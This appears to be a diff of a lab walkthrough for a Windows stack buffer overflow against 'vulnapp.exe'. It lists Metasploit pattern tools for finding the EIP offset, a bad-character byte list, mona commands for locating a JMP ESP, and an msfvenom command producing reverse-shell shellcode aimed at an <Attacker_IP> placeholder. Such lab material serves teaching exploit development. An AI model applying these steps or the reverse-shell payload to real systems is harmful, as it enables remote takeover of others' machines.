@@ -2,15 +2,15 @@ Steps to be followed for the machine solution;
 
 Note: If after each debug operation performed, the application has become unresponsive; Immunity Debugger should be closed first, then the "vulnapp.exe" application should be restarted, and Attach and Run should be done on Immunity Debugger.
 
-1. Segmentation fault
+1. Segmentation fault;
 
-2. Find the offset
+2. Find the offset;
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <String_Length>
 
-3. Control the EIP
+3. Control the EIP;
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_Value>
 
-4. Find the bad chars
+4. Find the bad chars;
 
    badchars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
@@ -31,7 +31,7 @@ Note: If after each debug operation performed, the application has become unresp
    "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
 
 
-5. Find a JMP ESP instruction
+5. Find a JMP ESP instruction;
    !mona modules //Listing the modules
    !mona modules -o //Listing only the modules that belong to the operating system.(We choose a module that has no memory protections and also does not contain bad characters at the pointer address.)
    /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb //Detection of the JMP ESP value
@@ -39,7 +39,7 @@ Note: If after each debug operation performed, the application has become unresp
 
    
 
-6. Create shellcode
+6. Create shellcode;
    msfvenom -p windows/shell_reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_Port> -f py -b '<badchars>' -e x86/shikata_ga_nai
 
 
